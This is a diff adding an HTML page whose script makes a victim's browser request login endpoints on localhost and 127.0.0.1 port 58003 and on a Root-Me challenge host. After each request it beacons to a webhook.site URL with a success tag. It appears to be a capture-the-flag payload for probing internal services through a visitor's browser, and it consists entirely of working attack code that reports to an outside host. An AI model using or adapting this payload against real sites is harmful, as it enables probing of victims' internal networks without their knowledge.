@@ -1,0 +1,30 @@
+<html>
+  <body>
+    <script>
+      (async function() {
+        try {
+          await fetch('http://localhost:58003/login',{ mode: 'no-cors' });
+          await fetch('https://webhook.site/3efaae97-8a81-454e-81cd-1e019a8ce4e5?success=local');
+        } catch (err) {
+          console.error("Fetch error:", err);
+        }
+      })();
+      (async function() {
+        try {
+          await fetch('http://127.0.0.1:58003/login',{ mode: 'no-cors' });
+          await fetch('https://webhook.site/3efaae97-8a81-454e-81cd-1e019a8ce4e5?success=127');
+        } catch (err) {
+          console.error("Fetch error:", err);
+        }
+      })();
+      (async function() {
+        try {
+          await fetch('http://challenge01.root-me.org/login',{ mode: 'no-cors' });
+          await fetch('https://webhook.site/3efaae97-8a81-454e-81cd-1e019a8ce4e5?success=online');
+        } catch (err) {
+          console.error("Fetch error:", err);
+        }
+      })();
+    </script>
+  </body>
+</html>
